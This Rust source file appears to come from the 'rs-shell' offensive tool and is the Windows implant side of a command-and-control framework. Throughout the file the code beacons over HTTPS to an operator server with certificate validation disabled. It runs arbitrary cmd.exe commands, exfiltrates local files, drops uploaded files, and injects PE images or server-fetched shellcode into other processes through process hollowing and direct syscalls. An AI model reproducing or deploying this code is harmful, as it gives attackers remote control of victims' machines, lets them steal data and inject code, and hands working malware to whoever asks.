use crate::utils::tools_windows::{call_loader_pe, call_loader_shellcode};

use std::error::Error;
use std::ffi::c_void;
use std::ffi::CString;
use std::fs::File;
use std::io::{self, BufReader, Read, Write};
use std::path::Path;
use std::process::Command;
use std::ptr::null_mut;
use std::{thread, time};

use windows_sys::Win32::Foundation::GetLastError;
use windows_sys::Win32::Networking::WinHttp::{
    INTERNET_DEFAULT_HTTPS_PORT, SECURITY_FLAG_IGNORE_UNKNOWN_CA,
};
use windows_sys::Win32::Networking::WinInet::{
    HttpOpenRequestA, HttpSendRequestA, InternetCloseHandle, InternetConnectA, InternetErrorDlg,
    InternetOpenA, InternetReadFile, InternetSetOptionA, ERROR_INTERNET_FORCE_RETRY,
    FLAGS_ERROR_UI_FILTER_FOR_ERRORS, FLAGS_ERROR_UI_FLAGS_CHANGE_OPTIONS,
    FLAGS_ERROR_UI_FLAGS_GENERATE_DATA, INTERNET_FLAG_IGNORE_CERT_CN_INVALID,
    INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, INTERNET_FLAG_KEEP_CONNECTION, INTERNET_FLAG_NEED_FILE,
    INTERNET_FLAG_NO_CACHE_WRITE, INTERNET_FLAG_RELOAD, INTERNET_FLAG_SECURE,
    INTERNET_OPEN_TYPE_PRECONFIG, INTERNET_OPTION_SECURITY_FLAGS, INTERNET_SERVICE_HTTP,
    SECURITY_FLAG_IGNORE_WRONG_USAGE,
};
use windows_sys::Win32::System::Console::GetConsoleWindow;

unsafe fn init_session(ip: &str, url: &str) -> Result<(*mut c_void, *mut c_void), io::Error> {
    // Standard user agent setup, can be changed to a custom one
    let user_agent_cstring = CString::new("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36").unwrap();
    let user_agent = user_agent_cstring.as_ptr() as *const u8;

    // The flag 'INTERNET_OPEN_TYPE_PRECONFIG' permits to find proxy configurations in the registry
    let h_internet = InternetOpenA(
        user_agent,
        INTERNET_OPEN_TYPE_PRECONFIG,
        null_mut(),
        null_mut(),
        0,
    );
    if h_internet.is_null() {
        return Err(io::Error::last_os_error());
    }

    let ip_cstring = CString::new(ip).unwrap();
    let ip = ip_cstring.as_ptr() as *const u8;
    let h_connect = InternetConnectA(
        h_internet,
        ip,
        INTERNET_DEFAULT_HTTPS_PORT,
        null_mut(),
        null_mut(),
        INTERNET_SERVICE_HTTP,
        0,
        0,
    );
    if h_connect.is_null() {
        InternetCloseHandle(h_internet);
        return Err(io::Error::last_os_error());
    }

    let http_verb = "GET";
    make_request(h_connect, url, http_verb, null_mut(), 0, false)?;

    Ok((h_internet, h_connect))
}

unsafe fn make_request(
    h_connect: *mut c_void,
    url: &str,
    http_verb: &str,
    data: *mut c_void,
    data_len: u32,
    download: bool,
) -> io::Result<Vec<u8>> {
    let http_verb_cstring = CString::new(http_verb).unwrap();
    let http_verb = http_verb_cstring.as_ptr() as *const u8;
    let url_cstring = CString::new(url).unwrap();
    let url = url_cstring.as_ptr() as *const u8;

    // The flag 'INTERNET_FLAG_KEEP_CONNECTION' permits to handle authentication
    let h_request = HttpOpenRequestA(
        h_connect,
        http_verb,
        url,
        null_mut(),
        null_mut(),
        null_mut(),
        INTERNET_FLAG_RELOAD
            | INTERNET_FLAG_SECURE
            | INTERNET_FLAG_KEEP_CONNECTION
            | INTERNET_FLAG_NEED_FILE
            | INTERNET_FLAG_NO_CACHE_WRITE,
        0,
    );
    if h_request.is_null() {
        return Err(io::Error::last_os_error());
    }

    // Flags to ignore certificate errors
    let mut flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
        | SECURITY_FLAG_IGNORE_WRONG_USAGE
        | INTERNET_FLAG_IGNORE_CERT_CN_INVALID
        | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
    InternetSetOptionA(
        h_request,
        (INTERNET_OPTION_SECURITY_FLAGS as i32).try_into().unwrap(),
        &mut flags as *mut _ as *mut c_void,
        std::mem::size_of_val(&flags) as u32,
    );

    loop {
        if download {
            let headers = CString::new("Content-Type: multipart/form-data; boundary=---------------------------345495480920487783503652546823").unwrap();
            let success = HttpSendRequestA(
                h_request,
                headers.as_ptr() as *const u8,
                -1isize as u32,
                data,
                data_len,
            );
            if success == 0 {
                InternetCloseHandle(h_request);
                return Err(io::Error::last_os_error());
            }
        } else {
            let success = HttpSendRequestA(h_request, null_mut(), 0, data, data_len);
            if success == 0 {
                log::debug!("HttpSendRequestA error: {}", io::Error::last_os_error());
                InternetCloseHandle(h_request);
                return Err(io::Error::last_os_error());
            }
        }

        // Check the errors and if the request requires authentication
        let dw_error_code = GetLastError();
        let hwnd = GetConsoleWindow();
        let dw_error = InternetErrorDlg(
            hwnd,
            h_request,
            dw_error_code,
            FLAGS_ERROR_UI_FILTER_FOR_ERRORS
                | FLAGS_ERROR_UI_FLAGS_CHANGE_OPTIONS
                | FLAGS_ERROR_UI_FLAGS_GENERATE_DATA,
            null_mut(),
        );

        if dw_error == ERROR_INTERNET_FORCE_RETRY {
            log::debug!("Force retry error: {}", io::Error::last_os_error());
            continue;
        } else {
            break;
        }
    }

    let mut buffer = [0; 1024];
    let mut vec_output = Vec::new();
    let mut read_size = 0;
    while InternetReadFile(
        h_request,
        buffer.as_mut_ptr() as *mut _,
        buffer.len() as u32,
        &mut read_size,
    ) != 0
        && read_size > 0
    {
        vec_output.extend_from_slice(&buffer[..read_size as usize]);
        read_size = 0;
    }

    InternetCloseHandle(h_request);
    Ok(vec_output)
}

fn do_stuff(cmd: &str) -> Vec<u8> {
    let exec = Command::new("cmd.exe").args(&["/c", cmd]).output().unwrap();

    let stdo = exec.stdout.as_slice();
    let _stdr = exec.stderr.as_slice();

    if _stdr.len() == 0 {
        return stdo.to_vec();
    } else {
        return _stdr.to_vec();
    }
}

pub fn implant(ip: &str) -> Result<(), Box<dyn Error>> {
    // Usefull for proxy authentication if proxy and credentials are already known
    /*let proxy = "http://proxyserver:8080";
    let username = "username";
    let password = "password";*/

    let index_url = "/rs-shell/index";
    match unsafe { init_session(ip, index_url) } {
        Ok((h_internet, h_connect)) => {
            log::debug!("Session initialized");

            let os = std::env::consts::FAMILY;
            unsafe {
                make_request(
                    h_connect,
                    "/rs-shell/os",
                    "POST",
                    os.as_ptr() as *mut c_void,
                    os.len() as u32,
                    false,
                )
                .expect("Error sending OS family");
            }

            loop {
                match unsafe {
                    make_request(
                        h_connect,
                        "/rs-shell/next_task",
                        "GET",
                        null_mut(),
                        0,
                        false,
                    )
                } {
                    Ok(response) => {
                        log::debug!(
                            "Task: {:?}",
                            String::from_utf8_lossy(response.as_slice())
                                .trim()
                                .trim_start_matches('\u{feff}')
                        );
                        // Needed to avoid borrowing error on freed value
                        let res = String::from_utf8_lossy(response.as_slice())
                            .trim()
                            .trim_start_matches('\u{feff}')
                            .to_string();
                        let (cmd, value) = match res.split_once(':') {
                            Some((cmd, value)) => (cmd, value),
                            None => (res.as_str(), ""),
                        };
                        match cmd {
                            "cmd" => {
                                let mut res_cmd = do_stuff(value);
                                log::debug!("{:?}", String::from_utf8_lossy(res_cmd.as_slice()));
                                match unsafe {
                                    make_request(
                                        h_connect,
                                        "/rs-shell/output_imp",
                                        "POST",
                                        res_cmd.as_mut_ptr() as *mut c_void,
                                        res_cmd.len() as u32,
                                        false,
                                    )
                                } {
                                    Ok(_) => log::debug!("Command executed"),
                                    Err(e) => log::debug!("Error: {}", e),
                                }
                            }
                            "load" | "load -h" | "load -s" => {
                                if cmd == "load -h" {
                                    let path: Vec<&str> = value.split(" ").collect();
                                    log::debug!("Loading the PE {} into the process {} with process hollowing", path[0], path[1]);
                                    match call_loader_pe(path[0], path[1], 0) {
                                        Ok(_) => log::debug!("PE loaded"),
                                        Err(e) => log::debug!(
                                            "Error loading PE in the remote process: {}",
                                            e
                                        ),
                                    }
                                } else if cmd == "load -s" {
                                    let path: Vec<&str> = value.split(" ").collect();
                                    log::debug!(
                                        "Loading the shellcode {} into the {} process memory",
                                        path[0],
                                        path[1]
                                    );
                                    match unsafe {
                                        make_request(
                                            h_connect,
                                            ("/rs-shell/shellcode".to_owned() + path[0]).as_str(),
                                            "GET",
                                            null_mut(),
                                            0,
                                            false,
                                        )
                                    } {
                                        Ok(response) => {
                                            //let shellcode = response.as_slice();
                                            match call_loader_shellcode(response, path[1], 1) {
                                                Ok(_) => log::debug!("Shellcode loaded"),
                                                Err(e) => {
                                                    log::debug!("Error loading shellcode: {}", e)
                                                }
                                            }
                                        }
                                        Err(e) => log::debug!("Error: {}", e),
                                    }
                                } else {
                                    log::debug!("Loading the PE {} into the implant memory", value);
                                    match call_loader_pe(value, "", 2) {
                                        Ok(_) => log::debug!("PE loaded"),
                                        Err(e) => log::debug!("Error loading PE: {}", e),
                                    }
                                }
                            }
                            "syscalls" | "syscalls -h" | "syscalls -s" => {
                                if cmd == "syscalls -h" {
                                    let path: Vec<&str> = value.split(" ").collect();
                                    log::debug!("Loading the PE {} into the process {} with process hollowing", path[0], path[1]);
                                    match call_loader_pe(path[0], path[1], 1) {
                                        Ok(_) => log::debug!("PE loaded"),
                                        Err(e) => log::debug!(
                                            "Error loading PE in the remote process: {}",
                                            e
                                        ),
                                    }
                                } else if cmd == "syscalls -s" {
                                    let path: Vec<&str> = value.split(" ").collect();
                                    log::debug!(
                                        "Loading the shellcode into a remote process memory"
                                    );
                                    match unsafe {
                                        make_request(
                                            h_connect,
                                            ("/rs-shell/shellcode".to_owned() + path[0]).as_str(),
                                            "GET",
                                            null_mut(),
                                            0,
                                            false,
                                        )
                                    } {
                                        Ok(response) => {
                                            let shellcode = response.as_slice();
                                            match call_loader_shellcode(
                                                shellcode.to_vec(),
                                                path[1],
                                                0,
                                            ) {
                                                Ok(_) => log::debug!("Shellcode loaded"),
                                                Err(e) => {
                                                    log::debug!("Error loading shellcode: {}", e)
                                                }
                                            }
                                        }
                                        Err(e) => log::debug!("Error: {}", e),
                                    }
                                } else {
                                    log::debug!("Loading the PE {} into the implant memory", value);
                                    match call_loader_pe(value, "", 3) {
                                        Ok(_) => log::debug!("PE loaded"),
                                        Err(e) => log::debug!("Error loading PE: {}", e),
                                    }
                                }
                            }
                            "upload" => {
                                let path = Path::new(value.trim());
                                log::debug!(
                                    "Uploading...{}",
                                    path.file_name().unwrap().to_str().unwrap()
                                );
                                match unsafe {
                                    make_request(
                                        h_connect,
                                        ("/rs-shell/upload".to_owned() + value).as_str(),
                                        "GET",
                                        null_mut(),
                                        0,
                                        false,
                                    )
                                } {
                                    Ok(response) => {
                                        File::create(path.file_name().unwrap().to_str().unwrap())
                                            .unwrap()
                                            .write_all(response.as_slice())?;
                                    }
                                    Err(e) => log::debug!("Error: {}", e),
                                }
                            }
                            "download" => {
                                let path = Path::new(value.trim());
                                log::debug!(
                                    "Downloading...{}",
                                    path.file_name().unwrap().to_str().unwrap()
                                );
                                match File::open(path) {
                                    Ok(file) => {
                                        let mut reader = BufReader::new(file);
                                        let mut buffer = Vec::new();
                                        reader
                                            .read_to_end(&mut buffer)
                                            .expect("Error reading file");
                                        // Let's build the multipart form data for big files
                                        let begin_multipart = String::from("-----------------------------345495480920487783503652546823\r\nContent-Disposition: form-data; name=\"file\"; filename=\"".to_owned() + path.file_name().unwrap().to_str().unwrap() + "\"\r\nContent-Type: text/plain\r\n\r\n");
                                        let end_multipart = String::from("\r\n-----------------------------345495480920487783503652546823--\r\n");
                                        buffer.splice(
                                            0..0,
                                            begin_multipart.as_bytes().iter().cloned(),
                                        );
                                        buffer.extend(end_multipart.as_bytes());

                                        match unsafe {
                                            make_request(
                                                h_connect,
                                                "/",
                                                "POST",
                                                buffer.as_mut_ptr() as *mut c_void,
                                                buffer.len() as u32,
                                                true,
                                            )
                                        } {
                                            Ok(response) => log::debug!(
                                                "{}",
                                                String::from_utf8_lossy(response.as_slice())
                                            ),
                                            Err(e) => log::debug!("Error: {}", e),
                                        }
                                    }
                                    Err(e) => log::debug!("Error: {}", e),
                                }
                            }
                            "No task" => {
                                log::debug!("No task");
                            }
                            "exit" | "quit" => {
                                log::debug!("Exiting...");
                                unsafe {
                                    InternetCloseHandle(h_connect);
                                    InternetCloseHandle(h_internet);
                                }

                                break;
                            }
                            _ => log::debug!("Unknown command"),
                        }
                    }
                    Err(e) => {
                        log::debug!("Error obtaining new task: {}. Trying to reinit the session from the begining.", e);
                        implant(ip)?;
                    }
                }
                // For the moment the implant sleeps 2 seconds between each request, could be interesting to randomize this value
                // Or setup an option to change it via the CLI
                thread::sleep(time::Duration::from_secs(2));
            }
        }
        Err(e) => {
            log::debug!("RS-Shell server cannot be reached: {}", e);
            return Err(Box::new(e));
        }
    }

    Ok(())
}
